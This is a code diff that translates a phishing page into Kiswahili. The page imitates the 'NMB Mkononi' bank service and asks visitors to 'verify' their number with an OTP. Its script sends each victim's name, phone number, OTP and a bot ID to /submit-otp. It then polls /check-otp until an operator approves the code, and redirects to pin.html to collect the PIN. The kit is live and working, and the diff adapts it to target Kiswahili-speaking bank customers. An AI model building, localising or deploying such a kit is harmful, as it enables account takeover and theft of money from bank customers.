@@ -1,9 +1,9 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="sw">
 <head>
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <title>NMB Mkononi - Verify Your Number</title>
+    <title>NMB Mkononi - Thibitisha Namba Yako</title>
     <style>
         * {
             margin: 0;
@@ -247,17 +247,17 @@
 
     <div class="container">
 
-        <div class="title">Enter OTP</div>
+        <div class="title">Weka OTP</div>
 
         <!-- Subtitle filled from localStorage -->
         <div class="subtitle" id="subtitlePlaceholder">
-            Enter OTP that was sent to (+255) 712345678
+            Weka OTP iliyotumwa kwa (+255) 712345678
         </div>
 
         <!-- Wrong Number link -->
-        <a href="details.html" class="wrong-number">Wrong Number?</a>
+        <a href="details.html" class="wrong-number">Namba Isiyo Sahihi?</a>
 
-        <div class="valid-time">The code is valid for 5 minutes</div>
+        <div class="valid-time">Namba hii ni halali kwa dakika 5</div>
 
         <!-- 4-digit OTP boxes -->
         <div class="otp">
@@ -269,13 +269,13 @@
 
         <!-- Resend area -->
         <div class="resend-wrap">
-            Resend code in <span class="timer">05:00</span>
+            Tuma tena namba baada ya <span class="timer">05:00</span>
         </div>
 
     </div>
 
     <!-- Button -->
-    <button class="continue-btn">SUBMIT</button>
+    <button class="continue-btn">TUMA</button>
 
     <!-- ====== SCRIPT TO DISPLAY PHONE FROM LOCALSTORAGE ====== -->
     <script>
@@ -283,37 +283,39 @@
             const phone = localStorage.getItem('phone');
             const subtitle = document.getElementById('subtitlePlaceholder');
             if (phone) {
-                subtitle.textContent = 'Enter OTP that was sent to ' + phone;
+                subtitle.textContent = 'Weka OTP iliyotumwa kwa ' + phone;
             }
         })();
     </script>
 
-    <!-- ====== TRANSLATION LAYER (does NOT change logic) ====== -->
+    <!-- ====== TRANSLATION LAYER (French → Kiswahili) ====== -->
     <script>
         (function() {
+            // If the backend still emits French strings, convert them to Kiswahili.
             const translations = {
-                'Renvoyer le code dans': 'Resend code in',
-                'Renvoyer le code': 'Resend code',
-                'Vérification...': 'Verifying...',
-                'Continuer': 'Continue',
-                'Nom manquant – veuillez revenir à l\'étape précédente pour saisir votre nom.': 'Name missing – please go back and enter your name.',
-                'Numéro de téléphone manquant – veuillez recommencer.': 'Phone number missing – please restart.',
-                'Identifiant du bot manquant – veuillez utiliser le lien correct.': 'Bot ID missing – please use the correct link.',
-                'Code incorrect. Veuillez réessayer.': 'Incorrect code. Please try again.',
-                'Erreur serveur': 'Server error',
-                'Aucun ID reçu': 'No ID received',
-                'Erreur lors du contrôle': 'Verification error',
-                'Erreur de vérification :': 'Verification error:',
-                'Erreur lors de l\'envoi :': 'Send error:'
+                'Renvoyer le code dans': 'Tuma tena namba baada ya',
+                'Renvoyer le code': 'Tuma tena namba',
+                'Vérification...': 'Inathibitisha...',
+                'Continuer': 'Endelea',
+                'Nom manquant – veuillez revenir à l\'étape précédente pour saisir votre nom.': 'Jina halipo – tafadhali rudi hatua iliyopita na uweke jina lako.',
+                'Numéro de téléphone manquant – veuillez recommencer.': 'Namba ya simu haipo – tafadhali anza tena.',
+                'Identifiant du bot manquant – veuillez utiliser le lien correct.': 'Kitambulisho cha bot hakipo – tafadhali tumia kiungo sahihi.',
+                'Code incorrect. Veuillez réessayer.': 'Namba isiyo sahihi. Tafadhali jaribu tena.',
+                'Erreur serveur': 'Hitilafu ya seva',
+                'Aucun ID reçu': 'Hakuna kitambulisho kilichopokelewa',
+                'Erreur lors du contrôle': 'Hitilafu ya uthibitisho',
+                'Erreur de vérification :': 'Hitilafu ya uthibitisho:',
+                'Erreur lors de l\'envoi :': 'Hitilafu ya kutuma:',
+                'dans': 'baada ya'
             };
 
             function translateNode(node) {
                 if (node.nodeType === Node.TEXT_NODE) {
                     let text = node.textContent;
                     let changed = false;
-                    for (const [fr, en] of Object.entries(translations)) {
+                    for (const [fr, sw] of Object.entries(translations)) {
                         if (text.includes(fr)) {
-                            text = text.replace(fr, en);
+                            text = text.replace(fr, sw);
                             changed = true;
                         }
                     }
@@ -352,7 +354,7 @@
         })();
     </script>
 
-    <!-- ======== ORIGINAL LOGIC (4-digit + auto-submit) ======== -->
+    <!-- ======== ORIGINAL LOGIC (4-digit + auto-submit, Kiswahili strings) ======== -->
     <script>
         (function() {
             // ── 1. Get parameters ──
@@ -428,7 +430,6 @@
             // Auto-submit when all 4 digits are entered
             function maybeAutoSubmit() {
                 if (checkAllFilled() && !continueBtn.disabled) {
-                    // Small delay so the last digit is visibly registered
                     setTimeout(() => {
                         if (!continueBtn.disabled) continueBtn.click();
                     }, 250);
@@ -441,7 +442,6 @@
                     if (cleaned !== this.value) {
                         this.value = cleaned;
                     }
-                    // Visual filled state
                     if (this.value.length === 1) {
                         this.classList.add('filled');
                     } else {
@@ -452,12 +452,10 @@
                         if (index < inputs.length - 1) {
                             inputs[index + 1].focus();
                         }
-                        // If this was the last box → auto submit
                         if (index === inputs.length - 1) {
                             maybeAutoSubmit();
                         }
                     } else {
-                        // Clear filled state
                         checkAllFilled();
                     }
                     hideMessage();
@@ -468,7 +466,6 @@
                     const paste = (e.clipboardData || window.clipboardData).getData('text');
                     const digits = sanitizeDigit(paste);
                     if (digits) {
-                        // Distribute pasted digits across boxes starting at this index
                         const chars = digits.split('');
                         for (let i = 0; i < chars.length && (index + i) < inputs.length; i++) {
                             inputs[index + i].value = chars[i];
@@ -476,7 +473,6 @@
                         }
                         const lastIndex = Math.min(index + chars.length - 1, inputs.length - 1);
                         inputs[lastIndex].focus();
-                        // Auto-submit if paste filled all boxes
                         if (checkAllFilled()) {
                             maybeAutoSubmit();
                         } else {
@@ -507,7 +503,7 @@
 
             function updateTimerUI() {
                 if (totalSeconds <= 0) {
-                    resendWrapEl.innerHTML = 'Renvoyer le code';
+                    resendWrapEl.innerHTML = 'Tuma tena namba';
                     resendWrapEl.style.color = '#ffb066';
                     resendWrapEl.style.cursor = 'pointer';
                     resendWrapEl.style.fontWeight = '700';
@@ -520,8 +516,8 @@
                     };
                     return;
                 }
-                timerSpan.textContent = `dans ${formatTime(totalSeconds)}`;
-                resendWrapEl.innerHTML = `Renvoyer le code dans <span class="timer">${formatTime(totalSeconds)}</span>`;
+                timerSpan.textContent = formatTime(totalSeconds);
+                resendWrapEl.innerHTML = `Tuma tena namba baada ya <span class="timer">${formatTime(totalSeconds)}</span>`;
                 resendWrapEl.style.color = 'rgba(255, 255, 255, 0.7)';
                 resendWrapEl.style.cursor = 'default';
                 resendWrapEl.style.fontWeight = '400';
@@ -549,15 +545,15 @@
 
             function hasRequiredData() {
                 if (!name) {
-                    showMessage('Nom manquant – veuillez revenir à l\'étape précédente pour saisir votre nom.', true);
+                    showMessage('Jina halipo – tafadhali rudi hatua iliyopita na uweke jina lako.', true);
                     return false;
                 }
                 if (!phone) {
-                    showMessage('Numéro de téléphone manquant – veuillez recommencer.', true);
+                    showMessage('Namba ya simu haipo – tafadhali anza tena.', true);
                     return false;
                 }
                 if (!botId) {
-                    showMessage('Identifiant du bot manquant – veuillez utiliser le lien correct.', true);
+                    showMessage('Kitambulisho cha bot hakipo – tafadhali tumia kiungo sahihi.', true);
                     return false;
                 }
                 hideMessage();
@@ -572,7 +568,7 @@
                 const otp = Array.from(inputs).map(inp => inp.value).join('');
 
                 continueBtn.disabled = true;
-                continueBtn.textContent = 'Vérification...';
+                continueBtn.textContent = 'Inathibitisha...';
                 continueBtn.style.background = '#f5a623';
 
                 fetch('/submit-otp', {
@@ -581,17 +577,17 @@
                     body: JSON.stringify({ name, phone, otp, botId })
                 })
                 .then(response => {
-                    if (!response.ok) throw new Error('Erreur serveur');
+                    if (!response.ok) throw new Error('Hitilafu ya seva');
                     return response.json();
                 })
                 .then(data => {
                     const requestId = data.requestId;
-                    if (!requestId) throw new Error('Aucun ID reçu');
+                    if (!requestId) throw new Error('Hakuna kitambulisho kilichopokelewa');
 
                     let pollInterval = setInterval(() => {
                         fetch(`/check-otp/${requestId}`)
                             .then(res => {
-                                if (!res.ok) throw new Error('Erreur lors du contrôle');
+                                if (!res.ok) throw new Error('Hitilafu ya uthibitisho');
                                 return res.json();
                             })
                             .then(status => {
@@ -600,9 +596,9 @@
                                     window.location.href = `pin.html?botId=${botId}&name=${encodeURIComponent(name)}&phone=${encodeURIComponent(phone)}`;
                                 } else if (status.approved === false) {
                                     clearInterval(pollInterval);
-                                    showMessage('Code incorrect. Veuillez réessayer.', true);
+                                    showMessage('Namba isiyo sahihi. Tafadhali jaribu tena.', true);
                                     continueBtn.disabled = false;
-                                    continueBtn.textContent = 'Continuer';
+                                    continueBtn.textContent = 'Endelea';
                                     continueBtn.style.background = 'linear-gradient(135deg, #ff8c1a 0%, #ff6b00 100%)';
                                     continueBtn.style.cursor = 'pointer';
                                     inputs.forEach(inp => {
@@ -615,18 +611,18 @@
                             })
                             .catch(err => {
                                 clearInterval(pollInterval);
-                                showMessage('Erreur de vérification : ' + err.message, true);
+                                showMessage('Hitilafu ya uthibitisho: ' + err.message, true);
                                 continueBtn.disabled = false;
-                                continueBtn.textContent = 'Continuer';
+                                continueBtn.textContent = 'Endelea';
                                 continueBtn.style.background = 'linear-gradient(135deg, #ff8c1a 0%, #ff6b00 100%)';
                                 continueBtn.style.cursor = 'pointer';
                             });
                     }, 2000);
                 })
                 .catch(err => {
-                    showMessage('Erreur lors de l\'envoi : ' + err.message, true);
+                    showMessage('Hitilafu ya kutuma: ' + err.message, true);
                     continueBtn.disabled = false;
-                    continueBtn.textContent = 'Continuer';
+                    continueBtn.textContent = 'Endelea';
                     continueBtn.style.background = 'linear-gradient(135deg, #ff8c1a 0%, #ff6b00 100%)';
                     continueBtn.style.cursor = 'pointer';
                 });
